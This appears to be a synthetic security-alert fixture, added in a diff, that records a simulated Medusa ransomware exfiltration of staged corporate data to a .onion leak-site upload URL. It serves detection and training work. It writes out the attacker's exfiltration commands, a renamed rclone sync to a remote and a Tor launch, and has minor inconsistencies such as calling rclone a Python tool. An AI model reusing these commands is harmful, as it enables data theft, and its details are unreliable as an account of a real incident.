@@ -1,0 +1,102 @@
+{
+  "vendor": "Palo Alto Networks",
+  "product": "Cortex XDR",
+  "severity": "High",
+  "category": "Exfiltration",
+  "alert_name": "Mass Data Exfiltration to TOR Hidden Service",
+  "description": "Critical data exfiltration activity detected on file server FS-PROD-01 (10.50.20.10) 82 minutes after discovery phase. The Medusa threat actor exfiltrated 47.3GB of sensitive corporate data to TOR hidden service medusakxxtp3uo7vusntvubnytaph4d3amxivbggl3hnhpk2nmus34yd.onion (Medusa ransomware leak site infrastructure). Exfiltration occurred over encrypted HTTPS connection via TOR proxy running on compromised host. Data staged in C:\\Windows\\Temp\\export\\ directory included: (1) Financial records - 12.4GB (Excel spreadsheets, QuickBooks databases), (2) Customer PII database - 8.7GB (SQL dumps with 2.3M customer records), (3) Source code repositories - 15.2GB (proprietary software), (4) Executive email archives - 11GB (Outlook PST files). The attacker used custom Python-based exfiltration tool (rclone.exe renamed to svchost32.exe) with compression and encryption. Network traffic analysis shows sustained 85Mbps upload for 78 minutes. This double-extortion tactic enables Medusa operators to publish stolen data on their leak site if ransom demands are not met, as documented in Unit 42 Medusa intelligence report.",
+  "relative_timestamp_hours": 68.55,
+  "campaign_name": "Medusa-VictimCorp",
+  "host_name": "FS-PROD-01",
+  "host_ip": [
+    172305930
+  ],
+  "host_os": "AGENT_OS_WINDOWS",
+  "user_name": [
+    "jsmith@victimcorp.local",
+    "IT-Admin@victimcorp.local"
+  ],
+  "account_id": "S-1-5-21-2847561234-9876543210-4567123890-5001",
+  "domain": "victimcorp.local",
+  "cgo_name": [
+    "svchost32.exe",
+    "tor.exe"
+  ],
+  "cgo_cmd": [
+    "C:\\Windows\\Temp\\svchost32.exe sync C:\\Windows\\Temp\\export remote:backup --progress",
+    "C:\\Windows\\Temp\\tor.exe -f C:\\Windows\\Temp\\torrc"
+  ],
+  "cgo_path": [
+    "C:\\Windows\\Temp\\svchost32.exe",
+    "C:\\Windows\\Temp\\tor.exe"
+  ],
+  "cgo_sha256": [
+    "9144a60ac86d4c91f7553768d9bef848acd3bd9fe3e599b7ea2024a8a3115669"
+  ],
+  "cgo_pid": [
+    9821
+  ],
+  "initiator_sha256": [
+    "9144a60ac86d4c91f7553768d9bef848acd3bd9fe3e599b7ea2024a8a3115669"
+  ],
+  "os_parent_name": [
+    "stage2.exe"
+  ],
+  "os_parent_cmd": [
+    "C:\\Windows\\Temp\\stage2.exe"
+  ],
+  "os_parent_pid": [
+    2341
+  ],
+  "file_name": [
+    "svchost32.exe",
+    "tor.exe",
+    "financial_export.7z",
+    "customer_db.7z",
+    "source_code.7z",
+    "email_archive.7z"
+  ],
+  "file_path": [
+    "C:\\Windows\\Temp\\svchost32.exe",
+    "C:\\Windows\\Temp\\tor.exe",
+    "C:\\Windows\\Temp\\export\\financial_export.7z",
+    "C:\\Windows\\Temp\\export\\customer_db.7z",
+    "C:\\Windows\\Temp\\export\\source_code.7z",
+    "C:\\Windows\\Temp\\export\\email_archive.7z"
+  ],
+  "file_hash": "9144a60ac86d4c91f7553768d9bef848acd3bd9fe3e599b7ea2024a8a3115669",
+  "file_sha256": [
+    "9144a60ac86d4c91f7553768d9bef848acd3bd9fe3e599b7ea2024a8a3115669"
+  ],
+  "filesize": "50802688000",
+  "remote_ip": [
+    3113878792
+  ],
+  "local_ip": [
+    172305930
+  ],
+  "remote_port": [
+    443
+  ],
+  "local_port": [
+    54782
+  ],
+  "url": [
+    "https://medusakxxtp3uo7vusntvubnytaph4d3amxivbggl3hnhpk2nmus34yd.onion/upload"
+  ],
+  "threat_name": "Data Exfiltration",
+  "attack_mode": "Data Exfiltration via TOR",
+  "verdict": "Malicious",
+  "risk_score": "96",
+  "risk_rating": "Critical",
+  "host_risk_level": "Critical",
+  "policy_type": "Data Loss Prevention",
+  "policy_description": "Mass data exfiltration to Medusa ransomware leak site - double extortion",
+  "policy_severity": "Critical",
+  "policy_recommendation": "Block TOR traffic immediately, kill exfiltration processes, delete staged data in C:\\Windows\\Temp\\export, contact legal counsel regarding data breach notification requirements (2.3M customer records), monitor Medusa Blog leak site for publication, prepare for ransom negotiation or data exposure, notify affected customers per GDPR/CCPA requirements",
+  "log_source": "Cortex XDR Agent",
+  "event_id": "NETWORK_CONNECTION",
+  "external_link": "https://unit42.paloaltonetworks.com/medusa-ransomware-escalation-new-leak-site/",
+  "mitre_att&ck_tactic": "TA0010 - Exfiltration",
+  "mitre_att&ck_technique": "T1048.002 - Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol"
+}
